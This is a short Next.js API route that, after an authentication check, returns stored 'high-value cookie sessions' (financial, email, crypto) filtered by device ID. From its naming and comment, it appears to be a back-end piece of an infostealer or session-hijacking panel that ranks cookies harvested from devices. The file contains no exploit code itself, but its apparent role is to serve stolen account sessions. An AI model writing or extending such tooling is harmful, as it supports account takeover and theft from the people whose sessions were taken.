import { NextRequest, NextResponse } from "next/server"
import { getHighValueSessions } from "@/lib/db-cookie-helpers"
import { validateRequest } from "@/lib/auth"

/**
 * GET /api/v1/cookie-sessions/high-value
 * Get high-value cookie sessions (financial, email, crypto, etc.)
 * Optional query param: deviceId
 */
export async function GET(request: NextRequest) {
  // Validate authentication
  const user = await validateRequest(request)
  if (!user) {
    return NextResponse.json({ success: false, error: "Unauthorized" }, { status: 401 })
  }

  try {
    const { searchParams } = new URL(request.url)
    const deviceId = searchParams.get("deviceId") || undefined

    const sessions = await getHighValueSessions(deviceId)

    return NextResponse.json({
      success: true,
      total: sessions.length,
      sessions,
    })
  } catch (error) {
    console.error("Error fetching high-value sessions:", error)
    return NextResponse.json(
      {
        success: false,
        error: error instanceof Error ? error.message : "Failed to fetch sessions",
      },
      { status: 500 },
    )
  }
}
